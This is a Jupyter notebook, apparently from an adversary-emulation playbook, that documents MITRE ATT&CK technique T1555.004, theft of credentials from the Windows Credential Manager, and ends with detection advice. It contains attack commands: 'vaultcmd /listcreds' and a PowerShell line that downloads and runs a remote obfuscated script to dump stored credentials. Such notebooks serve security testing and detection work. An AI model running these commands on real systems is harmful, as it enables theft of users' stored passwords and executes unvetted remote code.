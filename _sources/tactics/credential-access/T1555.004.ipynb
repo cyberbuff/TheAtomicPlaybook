{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "15e1b566",
   "metadata": {},
   "source": "# T1555.004 - Windows Credential Manager\nAdversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)"
  },
  {
   "cell_type": "markdown",
   "id": "620fb29b",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "74dec83e",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Access Saved Credentials via VaultCmd",
    "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nvaultcmd /listcreds:\"Windows Credentials\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "132c487d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f7e04e2f",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - WinPwn - Loot local Credentials - Invoke-WCMDump",
    "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae31fef6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "988f8cb3",
   "metadata": {},
   "source": "## Detection\nMonitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:\u201cWindows Credentials\u201d</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}